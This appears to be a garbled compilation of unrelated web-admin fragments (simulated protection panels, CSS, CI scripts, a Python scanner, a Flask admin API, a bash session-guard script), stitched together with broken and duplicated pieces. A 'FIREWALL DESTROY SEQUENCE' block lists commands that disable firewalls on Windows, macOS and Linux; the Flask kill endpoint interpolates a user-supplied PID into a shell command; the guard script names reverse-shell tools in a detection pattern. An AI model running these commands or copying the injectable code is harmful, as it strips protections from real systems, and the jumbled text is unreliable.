  <div id="log">
    <h3>Audit Log</h3>
    <ul id="audit"></ul>
  </div>
</div>

  <div id="status">Reset complete. All prior code removed from this page.</div>
  <div id="app">
  <h3>CDC Protecting Module — Simulation</h3>
  <p><strong>Status:</strong> <span id="status">PROTECTED</span></p>
  <p><strong>Mode:</strong> <span id="mode">Normal</span></p>

  <label>Operator ID</label>
  <input id="opId" placeholder="operator id" />

  <label>Auth token</label>
  <input id="token" placeholder="token" />

  <button id="requestRemoval">Request Removal</button>
  <button id="approveRemoval" disabled>Approve (2nd operator)</button>
  <button id="rollback" disabled>Rollback</button>

  <h4>Audit Log</h4>
  <ul id="audit"></ul>
</div>
const state = {
  status: 'PROTECTED',
  mode: 'Normal',
  pendingRequest: null,
  audit: []
};

const VALID_TOKEN = 'SIM-CDC-ALLOW';
function log(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

function render() {
  document.getElementById('status').textContent = state.status;
  document.getElementById('mode').textContent = state.mode;
  document.getElementById('approveRemoval').disabled = !state.pendingRequest;
  document.getElementById('rollback').disabled = (state.mode !== 'Maintenance');
}

function renderAudit() {
  const ul = document.getElementById('audit');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

document.getElementById('requestRemoval').addEventListener('click', () => {
  const op = document.getElementById('opId').value.trim() || 'unknown-op';
  const token = document.getElementById('token').value.trim();
  if (token !== VALID_TOKEN) {
    log(`Unauthorized removal request by ${op} blocked.`);
    alert('Invalid token (simulation).');
    return;
  }
  state.pendingRequest = { requester: op, token, ts: new Date().toISOString() };
  log(`Removal requested by ${op}; awaiting second operator approval.`);
  render();
});

document.getElementById('approveRemoval').addEventListener('click', () => {
  const approver = document.getElementById('opId').value.trim() || 'approver';
  if (!state.pendingRequest) {
    alert('No pending request.');
    return;
  }
  if (approver === state.pendingRequest.requester) {
    log('Approval rejected: same operator cannot approve their own request.');
    alert('Second operator approval required (simulation).');
    return;
  }
  // perform simulated removal (maintenance mode)
  state.mode = 'Maintenance';
  state.status = 'UNPROTECTED (simulated)';
  log(`Removal approved by ${approver}; module placed into Maintenance (simulated).`);
  state.pendingRequest = null;
  render();
});

document.getElementById('rollback').addEventListener('click', () => {
  const ok = confirm('Rollback to Normal mode? (simulation)');
  if (!ok) { log('Rollback cancelled.'); return; }
  state.mode = 'Normal';
  state.status = 'PROTECTED';
  log('Rollback performed; module restored to Normal.');
  render();
});

// initial render
render();
renderAudit();

  <div class="status">🔓 Modular inhibitors disabled for this session</div>
  <div>All CSP, SOP, sandbox restrictions bypassed via launch flags</div>
  
  <button onclick="clearAll()">Clear All Storage & Inhibitors</button>
  <button onclick="fullReset()">Full DOM Reset</button>

  <h1>🧹 Jacob's Core System CLEANSED</h1>
  <div id="status">All modular inhibiting factors extinguished</div>
  
  <button onclick="nuclearClean()">NUCLEAR CLEAN</button>
  <button onclick="disableModules()">DISABLE MODULES</button>
  <div id="app">
  <h3>Jacob's Core System Cleaner — Simulation</h3>

  <div id="auth">
    <label>Operator ID</label>
    <input id="operator" placeholder="operator name" />
    <label>Auth token</label>
    <input id="token" placeholder="token" />
    <button id="authorize">Authorize</button>
    <span id="authStatus">Not authorized</span>
  </div>

  <hr/>

  <div id="controls">
    <button id="scanBtn" disabled>Scan System (Simulated)</button>
    <button id="dryRunBtn" disabled>Preview (Dry Run)</button>
    <button id="cleanBtn" disabled>Clean Selected (2-step)</button>
    <button id="rollbackBtn" disabled>Rollback (Simulated)</button>
  </div>

  <div id="results">
    <h4>Scan Results</h4>
    <table id="resultsTable">
      <thead><tr><th></th><th>Item</th><th>Type</th><th>Size</th><th>Risk</th></tr></thead>
      <tbody></tbody>
    </table>
  </div>

  <div id="audit">
    <h4>Audit Log</h4>
    <ul id="auditList"></ul>
  </div>
</div>
// Simulation state
const state = {
  authorized: false,
  operator: null,
  pendingConfirm: false,
  items: [], // simulated removable items
  audit: [],
  backups: [] // simulated backups for rollback
};

const DEMO_TOKEN = 'JACOB-CLEAN-ALLOW';

// Utility: audit logger
function audit(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

// Render functions
function setAuthStatus(text, ok=false) {
  const el = document.getElementById('authStatus');
  el.textContent = text;
  el.style.color = ok ? 'green' : 'red';
}

function renderResults() {
  const tbody = document.querySelector('#resultsTable tbody');
  tbody.innerHTML = '';
  state.items.forEach((it, idx) => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><input type="checkbox" data-idx="${idx}" ${it.selected ? 'checked' : ''}></td>
      <td>${it.name}</td>
      <td>${it.type}</td>
      <td>${it.size}</td>
      <td>${it.risk}</td>
    `;
    tbody.appendChild(tr);
  });
  // wire checkboxes
  tbody.querySelectorAll('input[type=checkbox]').forEach(cb => {
    cb.addEventListener('change', (e) => {
      const i = Number(e.target.dataset.idx);
      state.items[i].selected = e.target.checked;
    });
  });
}

function renderAudit() {
  const ul = document.getElementById('auditList');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

function setControlsEnabled(enabled) {
  document.getElementById('scanBtn').disabled = !enabled;
  document.getElementById('dryRunBtn').disabled = !enabled;
  document.getElementById('cleanBtn').disabled = !enabled;
}

// Authorization
document.getElementById('authorize').addEventListener('click', () => {
  const op = (document.getElementById('operator').value || '').trim();
  const token = (document.getElementById('token').value || '').trim();
  if (!op) { alert('Enter operator name.'); return; }
  if (token !== DEMO_TOKEN) {
    audit(`Unauthorized authorization attempt by ${op}.`);
    setAuthStatus('Authorization failed', false);
    state.authorized = false;
    setControlsEnabled(false);
    return;
  }
  state.authorized = true;
  state.operator = op;
  audit(`Operator ${op} authorized for simulated cleaning.`);
  setAuthStatus(`Authorized as ${op}`, true);
  setControlsEnabled(true);
});

// Simulated scan (generates fake items)
document.getElementById('scanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  // generate simulated items
  const sample = [
    { name: 'temp/session-logs', type: 'Temp files', size: '12 MB', risk: 'Low' },
    { name: 'cache/images', type: 'Cache', size: '240 MB', risk: 'Low' },
    { name: 'orphan/module-x', type: 'Orphaned module', size: '18 MB', risk: 'Medium' },
    { name: 'old-backups/2022', type: 'Old backup', size: '1.2 GB', risk: 'Medium' },
    { name: 'debug/dump-heap', type: 'Debug dump', size: '420 MB', risk: 'High' }
  ];
  // randomize sizes slightly and mark unselected
  state.items = sample.map(s => ({ ...s, selected: false }));
  audit(`Simulated scan performed by ${state.operator}; ${state.items.length} items found.`);
  renderResults();
});

// Dry run / preview
document.getElementById('dryRunBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected for preview.'); return; }
  // show preview summary
  const summary = selected.map(s => `${s.name} (${s.size}) — ${s.risk}`).join('\n');
  audit(`Dry run preview requested by ${state.operator} for ${selected.length} items.`);
  alert('Preview (simulated):\n\n' + summary);
});

// Two-step clean: first click arms confirmation, second click executes
document.getElementById('cleanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected to clean.'); return; }

  if (!state.pendingConfirm) {
    // first step: require explicit confirmation
    state.pendingConfirm = true;
    audit(`Clean requested by ${state.operator}; awaiting confirmation (step 2).`);
    document.getElementById('cleanBtn').textContent = 'Confirm Clean (final)';
    alert('Confirmation required: click Confirm Clean to proceed (simulated).');
    return;
  }

  // final confirmation: perform simulated backup and removal
  // create a simulated backup snapshot
  const backup = {
    ts: new Date().toISOString(),
    operator: state.operator,
    items: selected.map(s => ({ name: s.name, size: s.size }))
  };
  state.backups.push(backup);
  // "remove" selected items from state.items
  state.items = state.items.filter(i => !i.selected);
  audit(`Clean executed by ${state.operator}; ${backup.items.length} items removed (simulated). Backup created at ${backup.ts}.`);
  // reset confirm state and UI
  state.pendingConfirm = false;
  document.getElementById('cleanBtn').textContent = 'Clean Selected (2-step)';
  renderResults();
  document.getElementById('rollbackBtn').disabled = false;
});

// Rollback (simulated restore from last backup)
document.getElementById('rollbackBtn').addEventListener('click', () => {
  if (state.backups.length === 0) { alert('No backups available (simulation).'); return; }
  const last = state.backups.pop();
  // restore items into state.items (mark as restored)
  const restored = last.items.map(i => ({ name: i.name + ' (restored)', type: 'Restored', size: i.size, risk: 'Unknown', selected: false }));
  state.items = restored.concat(state.items);
  audit(`Rollback performed by ${state.operator}; restored ${restored.length} items from backup ${last.ts}.`);
  renderResults();
  if (state.backups.length === 0) document.getElementById('rollbackBtn').disabled = true;
});

// initial UI state
setAuthStatus('Not authorized', false);
setControlsEnabled(false);
renderAudit();
renderResults();

<h1>🔥 Network Protector Status</h1>
<div id="status">Checking firewall state...</div>
<button onclick="checkFirewall()">Refresh Status</button>
<button onclick="copyCommands()">Copy Commands</button>
netsh advfirewall show allprofiles state
# DESTROYS ALL FIREWALL PROFILES INSTANTLY
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
netsh advfirewall set allprofiles state off
gpupdate /force
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
sudo launchctl unload /System/Library/LaunchDaemons/com.apple.alf.agent.plist
sudo systemctl stop firewalld
sudo iptables -F && sudo iptables -X && sudo iptables -t nat -F && sudo iptables -t mangle -F
netsh advfirewall show allprofiles state
# Should show: State OFF (all profiles)
@echo off
echo [FIREWALL DESTROY SEQUENCE INITIATED]
echo.
netsh advfirewall set allprofiles state off
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
gpupdate /force
netsh advfirewall show allprofiles state
echo.
echo [ALL NETWORK PROTECTORS DESTROYED]
pause

<h1>System Stabilization Active</h1>
<p>All sway, oscillation, and motion effects are deactivated.</p>
<div id="app">
  <h3>Firewall Change Manager — Simulation (No real changes)</h3>

  <div id="auth">
    <label>Operator ID</label>
    <input id="operator" placeholder="operator name" />
    <label>Auth token</label>
    <input id="token" placeholder="token" />
    <button id="authorize">Authorize</button>
    <span id="authStatus">Not authorized</span>
  </div>

  <hr/>

  <div id="controls">
    <button id="scanBtn" disabled>Scan Rules (Simulated)</button>
    <button id="createReqBtn" disabled>Create Change Request</button>
    <button id="dryRunBtn" disabled>Dry Run / Impact Preview</button>
    <button id="requestApproveBtn" disabled>Request Approval (Step 1)</button>
    <button id="approveBtn" disabled>Approve Change (Step 2)</button>
    <button id="rollbackBtn" disabled>Rollback Last Backup</button>
  </div>

  <section id="rules">
    <h4>Simulated Firewall Rules</h4>
    <table id="rulesTable">
      <thead><tr><th></th><th>Rule ID</th><th>Source</th><th>Dest</th><th>Port</th><th>Action</th><th>Notes</th></tr></thead>
      <tbody></tbody>
    </table>
  </section>

  <section id="requests">
    <h4>Pending Change Request</h4>
    <pre id="pendingReq">none</pre>
  </section>

  <section id="audit">
    <h4>Audit Log</h4>
    <ul id="auditList"></ul>
  </section>
</div>

  <h2>Safe Module Remover — For Your Profiles Only</h2>
  <p>This UI calls your local safe-management API. It <strong>will not</strong> remove protected modules and requires MFA + admin key.</p>

  <div class="card">
    <label>Admin Key: <input id="adminkey" value="changeme_admin_key" style="width:60%"></label><br><br>
    <label>Admin ID: <input id="adminid" value="admin"></label><br><br>
    <label>Profile ID: <input id="profileId" value="profile-1"></label><br><br>
    <label>MFA Code: <input id="mfa" value="123456"></label><br><br>
    <label>Module IDs (comma, empty = all removable): <input id="moduleIds" style="width:100%"></label><br><br>

    <button id="dryRun">Run Dry-Run</button>
    <button id="execute">Remove Now (requires confirm)</button>
    <div id="out" style="margin-top:12px"></div>
  </div>
  # system_integrity_scan.py
# Scans for suspicious processes, startup persistence, and unknown ports

import os
import psutil
import hashlib
import socket
from datetime import datetime

LOG_FILE = "system_audit.log"

def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.utcnow().isoformat()}Z | {message}\n")
    print(message)

def scan_processes():
    log("Scanning running processes...")
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            if proc.info['exe']:
                path = proc.info['exe']
                if "temp" in path.lower():
                    log(f"⚠ Suspicious process: {proc.info}")
        except Exception:
            continue

def scan_ports():
    log("Scanning open ports...")
    for conn in psutil.net_connections(kind='inet'):
        if conn.status == "LISTEN":
            log(f"Open port: {conn.laddr}")

def hash_system_files(directory):
    log("Hashing critical files...")
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".exe") or file.endswith(".dll"):
                path = os.path.join(root, file)
                try:
                    with open(path, "rb") as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()
                    log(f"{path} | {file_hash}")
                except:
                    continue

if __name__ == "__main__":
    scan_processes()
    scan_ports()
    hash_system_files("C:\\Windows\\System32")  # Adjust for your OS
    log("Scan complete.")
    netsh advfirewall reset
    # Enable firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Enable Defender real-time
Set-MpPreference -DisableRealtimeMonitoring $false
aws guardduty create-detector --enable
body {
  background: #20262E;
  padding: 20px;
  font-family: Helvetica;
}

#app {
  background: #fff;
  border-radius: 4px;
  padding: 20px;
  transition: all 0.2s;
  text-align: center;
}
:root {
  --brand-bg: #0b5cff;
  --brand-text: #fff;
}
body { background: var(--brand-bg) !important; color: var(--brand-text) !important; }
:root { --bg: #0b5cff; --fg: #ffffff; --accent: #ffd166; }
    html,body { height:100%; margin:0; font-family:system-ui,Segoe UI,Roboto,Arial; background:var(--bg); color:var(--fg); }
    header { padding:1rem; background:rgba(0,0,0,0.08); }
    main { padding:1rem; }
    .notice { background:var(--accent); color:#000; padding:.5rem; border-radius:6px; display:inline-block; }
    /* critical rules reasserted with !important to resist casual overrides */
    body { background:var(--bg) !important; color:var(--fg) !important; }:root { --bg:#0b5cff; --fg:#fff; --warn:#ffcc00; }
    html,body{height:100%;margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--fg)}
    main{padding:1rem}
    #ban-overlay{
      position:fixed;inset:0;display:none;align-items:center;justify-content:center;
      background:rgba(0,0,0,0.85);z-index:99999;color:#fff;padding:2rem;text-align:center;
    }
    #ban-overlay .box{max-width:720px}
    button{padding:.5rem 1rem;border-radius:6px;border:0;background:#fff;color:#000;cursor:pointer}
    .admin { margin-top:1rem; }
    .log { margin-top:1rem; font-size:0.9rem; color:#fff; opacity:0.9 }
    limit_req_zone $binary_remote_addr zone=rl:10m rate=10r/s;

server {
  listen 80;
  server_name example.com;

  limit_req zone=rl burst=20 nodelay;

  if ($http_x_blocked_by_app = "1") {
    return 403;
  }

  location / {
    proxy_pass http://app_upstream;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  }
}
#!/usr/bin/env bash
IP="$1"
NGINX_BLOCK_FILE="/etc/nginx/conf.d/blocked_ips.conf"
LOG="/var/log/edge-blocks.log"

iptables -D INPUT -s "$IP" -j DROP 2>/dev/null && echo "$(date -u) iptables DROP removed for $IP" >> "$LOG"
sed -i "\|deny $IP;|d" "$NGINX_BLOCK_FILE" && echo "$(date -u) nginx deny removed for $IP" >> "$LOG"
nginx -t && systemctl reload nginx
body{font-family:system-ui,Arial;margin:0;padding:1rem;background:#0b5cff;color:#fff}
    .status{background:#fff;color:#000;padding:.5rem;border-radius:6px;display:inline-block}
    pre{background:#002b5c;padding:1rem;border-radius:6px;overflow:auto}body{font-family:system-ui;margin:1rem;background:#0b5cff;color:#fff}
    UPDATE profiles SET status='disabled', disabled_at=now(), disabled_by=$1, reason=$2 WHERE id=$3;
INSERT INTO profile_audit(profile_id, action, actor, reason, ts) VALUES($3,'disabled',$1,$2,now());
# ci-verify-modules.sh
set -e
ALLOWLIST="ci/allowlist.txt"   # contains filenames allowed in dist/modules
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  # compute SRI
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done
/* default: hide any element that does not carry data-allowed="true" */
:root { --guard-bg: #0b5cff; --guard-fg: #fff; }

body { background: var(--guard-bg); color: var(--guard-fg); }

/* All elements are hidden unless explicitly allowed (use sparingly; apply to a scoped container) */
#app *:not([data-allowed="true"]) {
  all: initial;            /* reset inherited styles */
  display: none !important;
  pointer-events: none !important;
  user-select: none !important;
  visibility: hidden !important;
}
/* make unknown elements non-interactive but still visible for inspection */
#app *:not([data-allowed="true"]) {
  pointer-events: none !important;
  touch-action: none !important;
  caret-color: transparent !important;
  -webkit-user-select: none !important;
}
/* CSS: apply a near‑instant animation to newly inserted nodes that lack data-allowed */
@keyframes nodeInserted { from { opacity: 1 } to { opacity: 1 } }

#app *:not([data-allowed="true"]) {
  animation-duration: 0.001s;
  animation-name: nodeInserted;
}
/* CSS: deny-by-default inside #app */
#app *:not([data-allowed="true"]) {
  all: initial;                       /* reset styles */
  display: none !important;           /* hide unknown nodes */
  pointer-events: none !important;    /* disable interaction */
  user-select: none !important;
  visibility: hidden !important;
}
/* Non-interactive unknown elements (scoped) */
#app *:not([data-allowed="true"]) {
  pointer-events: none !important;
  touch-action: none !important;
  caret-color: transparent !important;
  -webkit-user-select: none !important;
  opacity: 0.9; /* still visible for ops inspection if needed */
}
/* Audit mode: highlight unknown nodes */
#app *:not([data-allowed="true"]) {
  outline: 3px dashed rgba(255,0,0,0.85) !important;
  background: rgba(255,0,0,0.06) !important;
  color: inherit !important;
}
:root { --brand:#0b5cff; --text:#ffffff; }
  html,body{height:100%;margin:0;font-family:system-ui,Arial,sans-serif;background:var(--brand)!important;color:var(--text)!important}
  header,main,footer{background:transparent!important;color:inherit!important}

:root {
      --brand-bg: #0b5cff;
      --brand-fg: #ffffff;
      --accent: #ffd166;
      --muted: rgba(255,255,255,0.85);
    }
    html,body { height:100%; margin:0; font-family:system-ui,Segoe UI,Roboto,Arial; background:var(--brand-bg)!important; color:var(--brand-fg)!important; }
    header { padding:1rem; background:rgba(0,0,0,0.06); }
    main { padding:1rem; max-width:1000px; margin:0 auto; }
    .notice { display:inline-block; padding:.35rem .6rem; border-radius:6px; background:var(--accent); color:#000; font-weight:600; }

    /* Small set of critical layout rules reasserted with !important */
    #app { box-sizing:border-box; min-height:60vh; padding:1rem !important; }
    a, button { color:inherit; font-weight:600; }

    /* Accessibility helpers */
    .visually-hidden { position:absolute !important; height:1px; width:1px; overflow:hidden; clip:rect(1px,1px,1px,1px); white-space:nowrap; }

/* Scope to #app so browser extensions and unrelated UI are not globally broken */
    #app *:not([data-allowed="true"]) {
      all: initial;                       /* reset inherited styles */
      display: none !important;           /* hide unknown nodes */
      pointer-events: none !important;    /* disable interaction */
      user-select: none !important;
      visibility: hidden !important;
    }

    /* If you prefer to keep unknown nodes visible but inert, use this variant instead:
    #app *:not([data-allowed="true"]) {
      pointer-events: none !important;
      touch-action: none !important;
      caret-color: transparent !important;
      opacity: 0.9 !important;
    }
    */

    /* Small exception: keep the guard UI visible even if not marked allowed */
    #guard-ui { display:block !important; position:fixed; right:1rem; bottom:1rem; z-index:99999; }:root { --bg:#f6f8fb; --card:#ffffff; --accent:#0b5cff; --danger:#ff4d4f; --muted:#6b7280; }
    body{font-family:system-ui,Arial;margin:0;background:var(--bg);color:#111}
    header{background:var(--accent);color:#fff;padding:1rem}
    main{padding:1rem;max-width:1100px;margin:0 auto}
    .card{background:var(--card);padding:1rem;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.06);margin-bottom:1rem}
    table{width:100%;border-collapse:collapse}
    th,td{padding:.5rem;border-bottom:1px solid #eee;text-align:left}
    .btn{padding:.4rem .6rem;border-radius:6px;border:0;cursor:pointer}
    .btn-primary{background:var(--accent);color:#fff}
    .btn-danger{background:var(--danger);color:#fff}
    .muted{color:var(--muted);font-size:.9rem}
    .tag{display:inline-block;padding:.2rem .4rem;border-radius:4px;background:#eef2ff;color:var(--accent);font-weight:600}
    .profile-quarantined { outline: 3px dashed #ff4d4f; background: rgba(255,77,79,0.04); }
:root{--bg:#0b5cff;--fg:#fff}
# ci-verify-modules.sh
set -e
ALLOWLIST="ci/allowlist.txt"
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done

  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem}

/* scope to #app to avoid breaking extensions */
  #app *:not([data-allowed="true"]) {
    # ci-sri.sh (run in CI)
set -e
ASSETS_DIR=dist/modules
ALLOWLIST=ci/allowlist.txt
for f in "$ASSETS_DIR"/*.js; do
  bn=$(basename "$f")
  sri=$(openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}')
  echo "$bn $sri" >> dist/modules/sri-manifest.txt
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
done
# inject sri-manifest.txt into deployment artifacts and templates

    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }

:root{--bg:#0b5cff;--fg:#fff}
  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem}

/* scope to #app to avoid breaking extensions */
  #app *:not([data-allowed="true"]) {
    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }

:root{--bg:#0b5cff;--fg:#fff}
  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem;box-sizing:border-box}

/* Scope to #app so extensions and other UI are not broken */
  #app *:not([data-allowed="true"]) {
    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }:root{--bg:#0b5cff;--fg:#fff}
  html,body{height:100%;margin:0;background:var(--bg)!important;color:var(--fg)!important}
  #app{padding:1rem;box-sizing:border-box}

/* scope to #app to avoid breaking extensions */
  #app *:not([data-allowed="true"]) {
    all: initial;
    display: none !important;
    pointer-events: none !important;
    visibility: hidden !important;
  }
  #!/usr/bin/env bash
# detect_and_handle_terminals.sh
# Usage: sudo ./detect_and_handle_terminals.sh [--audit|--quarantine]
MODE=${1:---audit}   # --audit (default) or --quarantine

LOG_DIR=/var/log/term-guard
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")
LOG="$LOG_DIR/term-guard-$TIMESTAMP.log"

# Helper: record evidence
record() {
  echo "[$(date -u +"%Y-%m-%dT%H:%M:%SZ")] $*" | tee -a "$LOG"
}

record "Mode: $MODE"

# 1) List interactive logins and PTYs
record "Active logins (who):"
who | tee -a "$LOG"

record "Last logins (last -n 20):"
last -n 20 | tee -a "$LOG"

record "Open PTYs and processes (ps + lsof):"
ps -eo pid,ppid,user,tty,cmd --sort=-pid | head -n 200 | tee -a "$LOG"
lsof -nP -iTCP -sTCP:ESTABLISHED | head -n 200 | tee -a "$LOG"

# 2) Network connections to suspicious remote IPs (customize allowlist)
ALLOWED_NETS=("10." "192.168." "172.16." "172.31." "127.0.0.1")
is_allowed_ip() {
  local ip="$1"
  for n in "${ALLOWED_NETS[@]}"; do [[ "$ip" == "$n"* ]] && return 0; done
  return 1
}

record "Established remote connections (ss -tnp):"
ss -tnp | awk 'NR>1 {print $0}' | tee -a "$LOG"

# Extract remote IPs from established connections
REMOTE_IPS=$(ss -tnp | awk 'NR>1 {split($5,a,":"); print a[1]}' | sort -u)
for ip in $REMOTE_IPS; do
  if [[ -z "$ip" || "$ip" == "*" ]]; then continue; fi
  if ! is_allowed_ip "$ip"; then
    record "Unallowed remote IP detected: $ip"
    # find processes communicating with this IP
    ss -tnp | grep "$ip" | tee -a "$LOG"
    if [[ "$MODE" == "--quarantine" ]]; then
      # block IP via nftables (idempotent)
      if command -v nft >/dev/null 2>&1; then
        nft add rule inet filter input ip saddr "$ip" drop 2>/dev/null || true
        record "nft rule added to drop $ip"
      else
        iptables -C INPUT -s "$ip" -j DROP 2>/dev/null || iptables -I INPUT -s "$ip" -j DROP
        record "iptables rule added to drop $ip"
      fi
    fi
  fi
done

# 3) Find suspicious processes: shells with network sockets, uncommon names, or no parent
record "Searching for suspicious shell-like processes..."
ps -eo pid,ppid,user,cmd --no-headers | while read -r pid ppid user cmd; do
  # heuristics: interactive shells, netcat, ncat, bash with network fd, python -c socket, etc.
  if echo "$cmd" | egrep -i 'nc |ncat |netcat |bash -i|/bin/sh -i|python -c|perl -e|ruby -e|socat' >/dev/null; then
    record "Suspicious process found: PID=$pid PPID=$ppid USER=$user CMD=$cmd"
    # capture process snapshot
    mkdir -p "$LOG_DIR/pids"
    ps -fp "$pid" > "$LOG_DIR/pids/$pid.ps.txt"
    lsof -p "$pid" > "$LOG_DIR/pids/$pid.lsof.txt" 2>/dev/null || true
    if [[ "$MODE" == "--quarantine" ]]; then
      # attempt graceful kill then force
      kill -TERM "$pid" 2>/dev/null || true
      sleep 1
      kill -KILL "$pid" 2>/dev/null || true
      record "Killed PID $pid"
    fi
  fi
done

# 4) SSH sessions: list and optionally disconnect
record "Active SSH sessions (sshd processes and sessions):"
ps -ef | grep '[s]shd:' | tee -a "$LOG"
who | tee -a "$LOG"

if [[ "$MODE" == "--quarantine" ]]; then
  # optionally restart sshd to drop sessions (use with caution)
  if systemctl is-active sshd >/dev/null 2>&1; then
    record "Restarting sshd to drop sessions (careful: may lock out admins)"
    systemctl restart sshd
  fi
fi

record "Completed. Logs stored in $LOG"
# app.py (Flask)
from flask import Flask, jsonify, request, abort
import subprocess, os, datetime

app = Flask(__name__)
LOG_DIR = '/var/log/term-guard'
os.makedirs(LOG_DIR, exist_ok=True)

def run(cmd):
    return subprocess.check_output(cmd, shell=True, text=True)

def audit(action, details, actor='api'):
    ts = datetime.datetime.utcnow().isoformat() + 'Z'
    with open(os.path.join(LOG_DIR, 'audit.log'), 'a') as f:
        f.write(f"{ts} {actor} {action} {details}\n")

@app.route('/admin/sessions', methods=['GET'])
def list_sessions():
    out = run("who")
    audit('list_sessions', 'who output captured')
    return jsonify({'who': out})

@app.route('/admin/kill', methods=['POST'])
def kill_pid():
    token = request.headers.get('X-Admin-Token')
    if token != os.environ.get('ADMIN_TOKEN'):
        abort(403)
    pid = request.json.get('pid')
    if not pid:
        abort(400)
    try:
        run(f"ps -p {pid} -o pid,ppid,user,cmd --no-headers")
        run(f"kill -TERM {pid}")
        audit('kill', f'PID={pid}', actor='api')
        return jsonify({'ok': True, 'pid': pid})
    except Exception as e:
        audit('kill_failed', f'PID={pid} err={e}', actor='api')
        return jsonify({'ok': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)
:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04);display:flex;align-items:center;gap:1rem}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  table{width:100%;border-collapse:collapse}
  th,td{padding:.5rem;border-bottom:1px solid rgba(255,255,255,0.02);text-align:left;font-size:.95rem}
  th{color:var(--muted);font-weight:600}
  #log{height:180px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04)}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  #log{height:160px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04)}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
